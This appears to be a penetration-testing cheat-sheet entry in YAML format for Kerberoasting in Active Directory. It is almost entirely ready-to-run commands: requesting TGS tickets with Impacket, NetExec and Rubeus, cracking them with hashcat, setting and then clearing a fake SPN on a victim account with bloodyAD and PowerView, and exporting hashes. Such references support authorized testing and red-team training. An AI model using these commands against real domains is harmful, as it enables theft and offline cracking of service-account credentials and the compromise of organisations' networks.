---
description: |
  Kerberoasting — request TGS tickets for service accounts with SPNs and crack them offline. Can also set SPNs on vulnerable accounts (targeted Kerberoasting).
commands:
  - have: Credentials
    cmd: |
      # Request TGS tickets for all SPNs (Impacket)
      impacket-GetUserSPNs senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -request -outputfile hashes.kerberoast

      # Kerberoasting via NetExec
      nxc ldap 10.10.10.27 -u sec_user -p 'P@ssw0rd' --kerberoasting output.txt

      # Crack TGS hashes with hashcat
      hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
  - have: SPN
    cmd: |
      # Targeted Kerberoasting — set SPN on a vulnerable account (bloodyAD)
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set object targetuser servicePrincipalName -v 'HTTP/fakespn.senshu.local'

      # Find SPN-bearing accounts (bloodyAD)
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 get search --filter '(servicePrincipalName=*)'

      # Request TGS for the targeted account
      impacket-GetUserSPNs senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -request -outputfile targeted.kerberoast

      # Clean up — remove the SPN after obtaining the hash
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set object targetuser servicePrincipalName
  - have: Shell
    cmd: |
      # --- Rubeus ---
      .\Rubeus.exe kerberoast /outfile:hashes.kerberoast /domain:senshu.local
      .\Rubeus.exe kerberoast /outfile:hashes.kerberoast /domain:senshu.local /rc4opsec
      .\Rubeus.exe kerberoast /outfile:hashes.kerberoast /domain:senshu.local /aes
      .\Rubeus.exe kerberoast /user:targetuser /outfile:hashes.kerberoast /domain:senshu.local /simple
      .\Rubeus.exe kerberoast /outfile:hashes.kerberoast /domain:senshu.local /creduser:sec_user /credpassword:'P@ssw0rd'

      # --- AD Module ---
      Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

      # --- PowerView ---
      Import-Module .\PowerView.ps1
      Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv -NoTypeInformation kerberoast.csv

      # Targeted Kerberoasting — GenericWrite on user, explicit $Cred (run as different user)
      $SecPassword = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
      $Cred = New-Object System.Management.Automation.PSCredential('senshu.local\sec_user', $SecPassword)
      Set-DomainObject -Credential $Cred -Identity targetuser -Server DC01.senshu.local -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
      Get-DomainSPNTicket -Credential $Cred -SPN "nonexistent/BLAHBLAH" | fl
      Set-DomainObject -Credential $Cred -Identity targetuser -Clear serviceprincipalname
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Active_Directory
  - Kerberos
techniques:
  - Kerberoasting
references:
  - https://github.com/fortra/impacket
  - https://github.com/GhostPack/Rubeus
  - https://www.netexec.wiki/
---
